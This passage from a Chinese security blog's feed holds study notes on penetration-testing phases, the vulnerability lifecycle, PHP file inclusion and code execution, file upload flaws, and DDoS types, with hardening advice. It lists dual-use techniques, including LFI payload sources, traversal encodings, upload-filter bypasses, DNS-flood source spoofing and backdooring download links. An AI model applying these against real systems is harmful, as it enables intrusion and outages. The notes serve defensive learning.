POC：验证性的渗透攻击代码</strong></p><p>在确定出最可行的攻击通道之后，接下来需要考虑该如何取得目标系统的访问控制权。在该阶段，渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。该阶段，高水平的渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，希望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p><p><strong>五、渗透攻击阶段（Exploitation） 清除痕迹</strong></p><p>渗透攻击是渗透测试过程中最具有魅力的环节。在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。</p><p>渗透攻击可以利用公开渠道可获取的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现。</p><p><strong>六、后渗透攻击阶段（Oost Exploitation）</strong></p><p>是整个渗透测试过程中最能体现渗透测试团队创造力与技术能力的环节。前面都在是在按部就班的完成非常普遍的目标，而在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具有价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。</p><p>在不同的测试场景中，这些攻击目标与途径可能是千变万化的，要求测试团队具有很强的创新意识、知识范畴、实际经验和技术能力。</p><p>假设测试对象为一个软件开发企业，核心业务是定制开发软件，渗透测试者可能拿到web权限，能否修改下载链接中的程序源码植入后门呢，造成的是企业声誉的影响。</p><p><strong>七、报告阶段（Reporting）</strong></p><p>渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和挖掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。</p><p>比如，一个sql注入漏洞，一般报告中会写出，对所有用户输入进行检查过滤，使用参数化的sql查询语句，在一个受限的用户账户上运行sql语句，以及使用定制的出错消息。但从客户角度按此修补并不完全，根本原因很可能是采用了不安全的第三方应用或者由不可控第三方开发。</p><h2 id="安全漏洞生命周期"><a href="#安全漏洞生命周期" class="headerlink" title="安全漏洞生命周期"></a>安全漏洞生命周期</h2><p>在渗透测试流程中，核心内容是找出目标系统中存在的安全漏洞，并实施渗透攻击，从而进入到西永中，而这一过程最主要的底层基础是目标系统中存在的安全漏洞（Vulnerability）。安全漏洞指信息系统中存在的缺陷或不适当的配置，它们可使用、攻击者在未授权情况下访问或破坏系统，导致信息系统面临安全风险。利用安全漏洞来造成入侵或破坏效果的程序就称为渗透代码（Exploit），或者漏洞利用代码。</p><p> <strong>安全漏洞指信息系统中存在的缺陷或不适当的配置，它们可使攻击者在未授权情况下访问或破坏系统，导致信息系统面临安全风险</strong>。利用安全漏洞来造成入侵或破坏效果的程序就称为<strong>渗透代码(Exploit)</strong>，或者<strong>漏洞利用代码</strong>。</p><p>围绕着安全漏洞生命周期所进行的攻防技术，一直是安全社区永恒的话题，而一个典型的安全路东生命周期包括如下7部分：</p><p><strong>1、 安全漏洞研究与挖掘</strong></p><p>由高技术水平的黑客与渗透测试师开展，主要利用源代码审核(白盒测试)、逆向工程(灰盒测试)、Fuzz测试(黑盒测试)等方法，挖掘目标系统中存有的可被利用的安全漏洞。</p><p><strong>2、渗透代码开发与测试</strong></p><p> 在安全漏洞挖掘的同时，黑客会开发概念验证性的渗透攻击代码(POC)，用于验证找到的安全漏洞是否确实存在，并确认其是否可被利用。</p><p><strong>3、安全漏洞和渗透代码在封闭团队中流传</strong></p><p>在发现安全漏洞并给出渗透攻击代码后，负责任的“白帽子”们采取的处理策略是首先通知厂商进行修补，而在厂商给出补丁后再进行公布；而“黑帽子”与“灰帽子”一般在封闭小规模团队中进行秘密地共享，以充分地利用这些安全漏洞和渗透攻击代码所带来的攻击价值。</p><p><strong>4、安全漏洞和渗透代码开始扩散</strong></p><p>由于各种原因，在封闭团队中秘密共享的安全漏洞和渗透代码最终会被披露出来，在互联网上得以公布，“黑帽子”会快速对其进行掌握和应用，并在安全社区中快速扩散。</p><p><strong>5、恶意程序出现并开始传播</strong></p><p>“黑帽子”将在掌握安全漏洞和渗透代码基础上，进一步开发更易使用、更具自动化传播能力的恶意程序，并通过黑客社区社会组织结构和互联网进行传播。在此过程中(或之前或之后)，厂商完成补丁程序开发和测试，并进行发布。</p><p><strong>6、 渗透代码/恶意程序大规模传播并危害互联网</strong></p><p>厂商发布补丁程序和安全警报将进一步地让整个黑客社区了解出现新的安全漏洞和相应的渗透代码、恶意程序，更多的“黑帽子”将从互联网或社区关系网获得并使用这些恶意程序，对互联网的危害也在这个阶段达到顶峰。</p><p><strong>7、渗透攻击代码/攻击工具/恶意程序逐渐消亡</strong></p><p>在厂商补丁程序、安全公司提供的检测和移除机制得到广泛应用后，相应的渗透代码、恶意程序将被“黑帽子”逐渐抛弃，从而慢慢消亡。</p><p><strong>安全漏洞生命周期如下图：</strong></p><p><img src="/images/pasted-85.png" alt="upload successful"></p><p><strong>在安全漏洞生命周期内，从安全漏洞被发现到厂商发布补丁程序用于修补该漏洞之前，安全社区普遍称为”0day”。</strong>在这段时间，黑客们攻击存有该安全漏洞的目标可以达到百分之百的成功率，同时也可以躲避检测，在“0day”的安全漏洞和对应的渗透代码对于黑客社区具有很高的价值，挖掘“0day”安全漏洞并给出渗透代码也成为高水平黑客的追求目标。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;渗透测试（Penetration-testing-Pentest）&quot;&gt;&lt;a href=&quot;#渗透测试（Penetration-testing-Pentest）&quot; class=&quot;headerlink&quot; title=&quot;渗透测试（Penetration testing Pentest）&quot;&gt;&lt;/a&gt;渗透测试（Penetration testing Pentest）&lt;/h2&gt;&lt;p&gt;通过实际的攻击进行安全测试与评估的方法。&lt;/p&gt;
&lt;p&gt;渗透测试过程一般需要对目标系统进行主动探测分析，以发现潜在的系统漏洞，包括不恰当的系统配置，已知或未知的软硬件漏洞，以及在安全计划与相应过程中的操作性弱点等&lt;br&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP安全</title>
    <link href="http://yoursite.com/2018/09/02/PHP%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2018/09/02/PHP安全/</id>
    <published>2018-09-02T08:33:42.000Z</published>
    <updated>2018-09-02T08:51:07.612Z</updated>
    
    <content type="html"><![CDATA[<p>PHP是一种非常流行的Web开发语言。在Python、Ruby等语言兴起的今天，PHP仍然是众多开发者所喜爱的选择，在中国尤其如此。</p><a id="more"></a><p>PHP的语法过于灵活，这也给安全工作带来了一些困扰。同时PHP也存在很多历史遗留的安全问题。</p><p>在PHP语言诞生之初，互联网安全问题尚不突出，许多今天已知的安全问题在当时并未显现，因此PHP语言设计上一开始并没有过多地考虑安全。时至今日，PHP遗留下来的历史安全问题依然不少，但PHP的开发者与整个PHP社区也想做出一些改变。</p><h2 id="0x01-文件包含漏洞"><a href="#0x01-文件包含漏洞" class="headerlink" title="0x01 文件包含漏洞"></a>0x01 文件包含漏洞</h2><p>文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包含漏洞。</p><p>严格来说，文件包含漏洞是“代码注入”的一种。在“注入攻击”一章中，曾经提到过“代码注入”这种攻击，其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行。“代码注入”的典型代表就是文件包含（File Inclusion）。文件包含可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下。</p><p>PHP:include(), include_once(), require(), require_once(), fopen(), readfile(), …</p><p>JSP/Servlet:ava.io.File(), java.io.FileReader(), …</p><p>ASP:include file, include virtual</p><p><strong>文件包含是PHP的一种常见用法，主要由4个函数完成：</strong></p><p>include()</p><p>require()</p><p>include_once()</p><p>require_once()</p><p>当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。这一特性，在实施攻击时将非常有用。</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ul><li>执行恶意代码</li><li>包含恶意文件控制网站</li><li>甚至控制网站服务器等</li></ul><h2 id="0x02-文件包含类型"><a href="#0x02-文件包含类型" class="headerlink" title="0x02 文件包含类型"></a>0x02 文件包含类型</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>本地文件包含（Local File Include，LFI），LFI允许攻击者通过浏览器包含本机上的文件。当一个WEB应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操纵输入数据、注入路径遍历字符、包含web服务器的其他文件。</p><p>使用“../../../”这样的方式来返回到上层目录中，这种方式又称为“目录遍历”（Path Traversal），常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务端逻辑。例如%2e%2e%2f等同于../</p><p><strong>本地文件包含的利用技巧</strong></p><p>远程文件包含漏洞之所以能够执行命令，就是因为攻击者能够自定义被包含的文件内容。因此本地文件包含漏洞想要执行命令，也需要找到一个攻击者能够控制内容的本地文件。</p><p>经过不懈的研究，安全研究者总结出了以下几种常见的技巧，用于本地文件包含后执行PHP代码。</p><p>（1）包含用户上传的文件。</p><p>（2）包含data:// 或php://input等伪协议。</p><p>（3）包含Session文件。</p><p>（4）包含日志文件，比如Web Server的access log。</p><p>（5）包含/proc/self/environ文件。</p><p>（6）包含上传的临时文件（RFC1867）。</p><p>（7）包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析。</p><h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>远程文件包含（Remote File Include，RFI）， RFI允许攻击者包含远程文件，远程文件包含需要设置allow_url_include = On，四个文件都支持HTTP、FTP等协议，相对本地文件包含更容易利用，出现的频率没有本地包含多。</p><p>风险：攻击者可利用代码注入漏洞执行任意代码，来操作服务器；攻击者可利用代码注入漏洞操作数据库，插入恶意数据，可能获取系统权限；代码注入攻击后可以进一步对网络渗透，由于代码注入攻击多半可获取系统权限，对网络的进一步渗透难度大大降低。 </p><p>Metasploit中包含一个脚本自动化完成包含日志文件的攻击：</p><p><img src="/images/107.png" alt="upload successful"></p><h2 id="0x03-挖掘经验"><a href="#0x03-挖掘经验" class="headerlink" title="0x03 挖掘经验"></a>0x03 挖掘经验</h2><p>模块加载、cache调用，传入的参数拼接包含路径</p><p>include()</p><p>使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p><p>inclue_once()</p><p>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p><p> require()</p><p>使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p><p> requre_once()</p><p>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p><h3 id="文件包含修复方案"><a href="#文件包含修复方案" class="headerlink" title="文件包含修复方案"></a>文件包含修复方案</h3><ul><li>关闭远程包含参数开关，彻底切断这个业务相比较</li><li>设置类似白 名单的方法，筛选固定文件名</li><li>常见目录穿越字符进行过滤，如（./  .//  ..\等）</li></ul><h2 id="0x04-变量覆盖漏洞"><a href="#0x04-变量覆盖漏洞" class="headerlink" title="0x04 变量覆盖漏洞"></a>0x04 变量覆盖漏洞</h2><h3 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h3><p>变量如果未被初始化，且能被用户所控制，那么狠可能会导致安全问题，而在PHP中，这种情况在register_globals为ON时尤其严重。</p><p><strong>extract（）变量覆盖</strong></p><p><strong>遍历初始化变量</strong></p><p><strong>import_request_variables变量覆盖</strong></p><p><strong>parse_str()变量覆盖</strong></p><p>还有一些变量覆盖的方法，难以一次列全，但有以下安全建议：</p><p>首先，确保register_globals =OFF。若不能自定义php.ini，则应该在代码中控制。</p><p>其次，熟悉可能造成变量覆盖的函数和方法，检查用户是否能控制变量的来源。</p><p>最后，养成初始化变量的好习惯。</p><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><h4 id="“危险函数”执行代码"><a href="#“危险函数”执行代码" class="headerlink" title="“危险函数”执行代码"></a>“危险函数”执行代码</h4><p>文件包含漏洞是可以造成代码执行的。但在PHP中，能够执行代码的方式远不止文件包含漏洞一种，比如危险函数popen()、system()、passthru()、exec()等都可以直接执行系统命令。此外，eval()函数也可以执行PHP代码。还有一些比较特殊的情况，比如允许用户上传PHP代码，或者是应用写入到服务器的文件内容和文件类型可以由用户控制，都可能导致代码执行</p><p><strong>phpMyAdmin 3.4.3.远程代码执行漏洞</strong></p><p><strong>MyBB 1.4远程代码执行漏洞</strong></p><p><strong>挖掘漏洞的过程，通常需要先找到危险函数，然后回溯函数的调用过程，最终看在整个调用的过程中用户是否有可能控制输入</strong></p><h2 id="0x05-制定安全的PHP环境"><a href="#0x05-制定安全的PHP环境" class="headerlink" title="0x05 制定安全的PHP环境"></a>0x05 制定安全的PHP环境</h2><h3 id="通过配置php-ini来加固PHP的运行环境："><a href="#通过配置php-ini来加固PHP的运行环境：" class="headerlink" title="通过配置php.ini来加固PHP的运行环境："></a>通过配置php.ini来加固PHP的运行环境：</h3><p><strong>register_globals</strong></p><p>当register_globals = ON时，PHP不知道变量从何而来，也容易出现一些变量覆盖的问题。因此从最佳实践的角度，强烈建议设置register_globals = OFF，这也是PHP新版本中的默认设置。</p><p><strong>open_basedir</strong></p><p>open_basedir可以限制PHP只能操作指定目录下的文件。这在对抗文件包含、目录遍历等攻击时非常有用。我们应该为此选项设置一个值。需要注意的是，如果设置的值是一个指定的目录，则需要在目录最后加上一个“/”，否则会被认为是目录的前缀。</p><p>￼open_basedir = /home/web/html/</p><p><strong>allow_url_include</strong></p><p>为了对抗远程文件包含，请关闭此选项，一般应用也用不到此选项。同时推荐关闭的还有allow_url_fopen。</p><pre><code>allow_url_fopen = Off￼allow_url_include = Off</code></pre><p><strong>display_errors</strong></p><p>错误回显，一般常用于开发模式，但是很多应用在正式环境中也忘记了关闭此选项。错误回显可以暴露出非常多的敏感信息，为攻击者下一步攻击提供便利。推荐关闭此选项。</p><pre><code>display_errors = Off</code></pre><p><strong>log_errors</strong></p><p>在正式环境下用这个就行了，把错误信息记录在日志里。正好可以关闭错误回显。</p><pre><code>log_errors = On</code></pre><p><strong>magic_quotes_gpc</strong></p><p>推荐关闭，它并不值得依赖（请参考“注入攻击”一章），已知已经有若干种方法可以绕过它，甚至由于它的存在反而衍生出一些新的安全问题。XSS、SQL注入等漏洞，都应该由应用在正确的地方解决。同时关闭它还能提高性能。￼</p><pre><code>magic_quotes_gpc = OFF</code></pre><p><strong>cgi.fix_pathinfo</strong></p><p>若PHP以CGI的方式安装，则需要关闭此项，以避免出现文件解析问题（请参考“文件上传漏洞”一章）。</p><pre><code>cgi.fix_pathinfo = 0</code></pre><p><strong>session.cookie_httponly</strong></p><p>开启HttpOnly（HttpOnly的作用请参考“跨站脚本攻击”一章）。</p><pre><code>session.cookie_httponly = 1</code></pre><p><strong>session.cookie_secure</strong></p><p>若是全站HTTPS则请开启此项。</p><pre><code>session.cookie_secure =1</code></pre><p><strong>safe_mode</strong></p><p>PHP的安全模式是否应该开启的争议一直比较大。一方面，它会影响很多函数；另一方面，它又不停地被黑客们绕过，因此很难取舍。如果是共享环境（比如App Engine），则建议开启safe_mode，可以和disable_functions配合使用；如果是单独的应用环境，则可以考虑关闭它，更多地依赖于disable_functions控制运行环境安全。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PHP是一种非常流行的Web开发语言。在Python、Ruby等语言兴起的今天，PHP仍然是众多开发者所喜爱的选择，在中国尤其如此。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件包含漏洞，PHP" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%8CPHP/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://yoursite.com/2018/09/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/09/02/文件上传漏洞/</id>
    <published>2018-09-02T07:58:54.000Z</published>
    <updated>2018-09-02T08:30:43.196Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身是没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><a id="more"></a><p><strong>文件上传后导致的常见安全问题一般有：</strong></p><ul><li>上传文件的Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。</li><li>上传文件是Flash的策略文件ceossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似）</li><li>上传文件的钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</li></ul><p>文件上传漏洞一般的欧式指“上传Web脚本能够服务器解析”的问题。</p><p><strong>FCKEditor是一款非常流行的富文本编辑器</strong></p><p><strong>设计安全的文件上传功能</strong></p><ul><li>文件上传的目录设置为不可执行</li><li>判断文件类型</li><li>使用随机数改写文件名和文件路径</li><li>单独设置文件服务器的域名</li></ul><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>上传文件的时候，服务器端脚本语言未对上传的文件进行严格的验证和过滤，就有可能上传恶意的文件，从而控制整个网站，甚至是服务器。</p><h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>文件可以上传、知道文件上传的路径、上传文件可以被访问、上传文件可以被执行</p><h3 id="文件上传可控点"><a href="#文件上传可控点" class="headerlink" title="文件上传可控点"></a>文件上传可控点</h3><p>Content-Length,即上传内容大小</p><p>MAX_FILE_SIZE,即上传内容的最大长度</p><p>filename,即上传文件名</p><p>Content-Type,即上传文件类型</p><p>请求包中的乱码字段，即是所上传文件的内容</p><p>有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现</p><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><ul><li>上传点都调用同一个上传类，直接全局搜索上传函数</li><li>黑盒寻找上传点，代码定位</li></ul><h3 id="代码案例"><a href="#代码案例" class="headerlink" title="代码案例"></a>代码案例</h3><ul><li>name：客户端的原始上传文件名称</li><li>Type：上传文件的MIME类型</li><li>Tmp_name：服务器端用来保存上传文件的临时文件路径</li><li>Error：上传文件时的错误信息</li><li>Size：上传文件的大小，单位</li></ul><h3 id="文件上传绕过客户端"><a href="#文件上传绕过客户端" class="headerlink" title="文件上传绕过客户端"></a>文件上传绕过客户端</h3><ul><li>用firebug将form表单中的onsubmit事件删除</li><li>上传木马文件，Burp拦截数据包，修改扩展名</li></ul><h3 id="文件上传绕过服务端"><a href="#文件上传绕过服务端" class="headerlink" title="文件上传绕过服务端"></a>文件上传绕过服务端</h3><ul><li>黑白名单过滤</li><li>修改MIME类型</li><li>截断上传攻击</li><li>.htaccess文件攻击</li><li>目录验证</li></ul><h3 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h3><ul><li>检测文件上传内容</li></ul><p>黑白名单验证，检测文件扩展名是否合法</p><p>MIME验证，检测文件的MIME类型</p><ul><li>限制文件大小</li><li>更改临时文件夹的路径</li><li>读取上传文件的绝对路径与文件名称</li><li>隐藏文件路面</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h2&gt;&lt;p&gt;文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身是没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>应用层拒绝服务攻击</title>
    <link href="http://yoursite.com/2018/09/02/%E5%BA%94%E7%94%A8%E5%B1%82%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/09/02/应用层拒绝服务攻击/</id>
    <published>2018-09-02T07:06:58.000Z</published>
    <updated>2018-09-02T07:28:06.476Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-DDOS简介"><a href="#0x01-DDOS简介" class="headerlink" title="0x01 DDOS简介"></a>0x01 DDOS简介</h2><p>DDOS又称为分布式拒绝服务，全称是Distrbuted Denial of Service。DDOS本是利用合理的请求造成资源过载，导致服务不可用。</p><a id="more"></a><p>分布式拒绝服务DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p><p>常见的DDOS攻击有SYN flood、UDP flood、ICMP flood等。其中SYN flood是一种最为经典的DDOS攻击，其发现于1996年，但至今仍然保持着非常强大的生命力。</p><h2 id="0x02-DDOS攻击示意图："><a href="#0x02-DDOS攻击示意图：" class="headerlink" title="0x02 DDOS攻击示意图："></a>0x02 DDOS攻击示意图：</h2><p><img src="/images/SQL/87.jpg" alt="upload successful"></p><h3 id="TCP三次握手："><a href="#TCP三次握手：" class="headerlink" title="TCP三次握手："></a>TCP三次握手：</h3><p><img src="/images/SQL/88.jpg" alt="upload successful"></p><p>（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x；</p><p>（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号x+1和服务器端的初始序列号y；</p><p>（3）客户端收到服务器端返回的SYN+ACK报文后，向服务器端返回一个确认号为y+1、序号为x+1的ACK报文，一个标准的TCP连接完成。</p><p>可是SYN flood在攻击时，首先伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYN Time（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。</p><p>对抗SYN flood的主要措施有SYN Cookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。</p><h2 id="0x03-攻击类型"><a href="#0x03-攻击类型" class="headerlink" title="0x03 攻击类型"></a>0x03 攻击类型</h2><ul><li><h3 id="网络层攻击"><a href="#网络层攻击" class="headerlink" title="网络层攻击"></a>网络层攻击</h3><ul><li><p><strong>Syn-flood</strong></p><p>利用TCP建立连接时3次握手的“漏洞”，通过原始套接字发送源地址虚假的SYN报文，使目标主机永远无法完成3次握手，占满了系统的协议栈队列，资源得不到释放，进而拒绝服务，是互联网中最主要的DDOS攻击形式之一。网上有一些加固的方法，例如调整内核参数的方法，可以减少等待及重试，加速资源释放，在小流量syn-flood的情况下可以缓解，但流量稍大时完全不抵用。防御syn-flood的常见方法有：syn proxy、syn cookies、首包（第一次请求的syn包）丢弃等。</p></li><li><p><strong>ACK-flood</strong></p><p>对于虚假的ACK包，目标设备会直接回复RST包丢弃连接，所以伤害值远不如syn-flood。DDOS的一种原始方式。</p></li><li><p><strong>UDP-flood</strong></p><p>使用原始套接字伪造大量虚假源地址的UDP包，目前以DNS协议为主。</p></li><li><p><strong>ICMP-flood</strong></p><p>Ping洪水，比较古老的方式。</p></li></ul></li><li><h3 id="应用层攻击"><a href="#应用层攻击" class="headerlink" title="应用层攻击"></a>应用层攻击</h3><ul><li><p><strong>CC</strong></p><p>ChallengeCollapsar的名字源于挑战国内知名安全厂商绿盟的抗DDOS设备-“黑洞”，通过botnet的傀儡主机或寻找匿名代理服务器，向目标发起大量真实的http请求，最终消耗掉大量的并发资源，拖慢整个网站甚至彻底拒绝服务。</p><p>“CC攻击”的前身是一个叫fatboy的攻击程序，当时黑客为了挑战绿盟的一款反DDOS设备开发了它。绿盟是中国著名的安全公司之一，它有一款叫“黑洞（Collapasar）”的反DDOS设备，能够有效地清洗SYN Flood等有害流量。而黑客则挑衅式地将fatboy所实现的攻击方式命名为：Challenge Collapasar（简称CC），意指在黑洞的防御下，仍然能有效完成拒绝服务攻击。</p><p>CC攻击的原理非常简单，就是对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。在Web应用中，查询数据库、读/写硬盘文件等操作，相对都会消耗比较多的资源</p><p>互联网的架构追求扩展性本质上是为了提高并发能力，各种SQL性能优化措施：消除慢查询、分表分库、索引、优化数据结构、限制搜索频率等本质都是为了解决资源消耗，而CC大有反其道而行之的意味，占满服务器并发连接数，尽可能使请求避开缓存而直接读数据库，读数据库要找最消耗资源的查询，最好无法利用索引，每个查询都全表扫描，这样就能用最小的攻击资源起到最大的拒绝服务效果。</p><p>互联网产品和服务依靠数据分析来驱动改进和持续运营，所以除了前端的APP、中间件和数据库这类OLTP系统，后面还有OLAP，从日志收集，存储到数据处理和分析的大数据平台，当CC攻击发生时，不仅OLTP的部分受到了影响，实际上CC会产生大量日志，直接会对后面的OLAP产生影响，影响包括两个层面，一个当日的数据统计完全是错误的。第二个层面因CC期间访问日志剧增也会加大后端数据处理的负担。</p><p>CC是目前应用层攻击的主要手段之一，在防御上有一些方法，但不能完美解决这个问题。</p></li><li><p><strong>DNS flood</strong></p><p>伪造源地址的海量DNS请求，用于是淹没目标的DNS服务器。对于攻击特定企业权威DNS的场景，可以将源地址设置为各大ISP DNS服务器的ip地址以突破白名单限制，将查询的内容改为针对目标企业的域名做随机化处理，当查询无法命中缓存时，服务器负载会进一步增大。</p><p>DNS不只在UDP-53提供服务，同样在TCP协议提供服务，所以防御的一种思路就是将UDP的查询强制转为TCP，要求溯源，如果是假的源地址，就不再回应。对于企业自有权威DNS服务器而言，正常请求多来自于ISP的域名递归解析，所以将白名单设置为ISP的DNS server列表。对于源地址伪造成ISP DNS的请求，可以通过TTL值进一步判断。</p></li><li><p><strong>慢速连接攻击</strong></p><p>针对http协议，以知名的slowloris攻击为起源：先建立http连接，设置一个较大的content-length，每次只发送很少的字节，让服务器一直以为http头部没有传输完成，这样的连接一多很快就会出现连接耗尽。</p><p>目前出现了一些变种，http慢速的post请求和慢速的read请求都是基于相同的原理。</p></li><li><p><strong>DOS攻击</strong></p><p>应用层DDOS，不同于网络层DDOS，由于发生在应用层，因此TCP三次握手已经完成，连接已经建立，所以发起攻击的IP地址也都是真实的。但应用层DDOS有时甚至比网络层DDOS攻击更为可怕，因为今天几乎所有的商业Anti-DDOS设备，只在对抗网络层DDOS时效果较好，而对应用层DDOS攻击却缺乏有效的对抗手段。</p><p>有些服务器程序存在bug、安全漏洞，或架构性缺陷，攻击者可以通过构造的畸形请求发送给服务器，服务器因不能正确处理恶意请求而陷入僵死状态，导致拒绝服务。例如某些版本的app服务器程序存在缓冲区溢出，漏洞可以触发但无法得到shell，攻击者可以改变程序执行流程使其跳转到空指针或无法处理的地址，用户态的错误会导致进程挂起，如果错误不能被内核回收则可能使系统当掉。</p><p>这类问题效果也表现为拒绝服务，但本质上属于漏洞，可以通过patch程序的最新版本解决，笔者认为不属于DDOS的范畴。</p></li></ul></li><li><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" 